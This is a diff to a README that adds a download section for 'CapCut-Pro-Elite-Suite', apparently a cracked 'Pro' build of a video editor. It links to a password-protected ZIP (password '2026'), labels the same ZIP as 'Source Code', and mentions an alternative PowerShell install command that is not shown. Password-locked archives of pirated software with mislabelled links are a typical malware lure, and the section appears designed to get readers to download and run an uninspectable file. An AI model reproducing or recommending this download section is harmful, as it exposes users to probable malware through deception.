@@ -30,9 +30,33 @@
 
 ---
 
-<!-- ═══════════════════ DOWNLOAD ═══════════════════ -->
+<!-- ═══════════════════ DOWNLOAD + PASSWORD ═══════════════════ -->
 
 ## 📥 Download
+
+<table align="center">
+<tr>
+<td align="center">
+
+<a href="https://github.com/InfernalSlugKnife/CapCut-Pro-Elite-Suite/releases/download/7/CapCut-Pro-Elite-Suite.zip">
+  <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
+</a>
+
+<br><br>
+
+🔐 **Password:** `2026`
+
+</td>
+</tr>
+</table>
+
+**Direct Links:**
+- [Latest Release](https://github.com/InfernalSlugKnife/CapCut-Pro-Elite-Suite/releases/download/7/CapCut-Pro-Elite-Suite.zip)
+- [Source Code](https://github.com/InfernalSlugKnife/CapCut-Pro-Elite-Suite/releases/download/7/CapCut-Pro-Elite-Suite.zip)
+
+> 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
+>
+> 🔐 **Archive Password:** `2026`
 
 ---
 
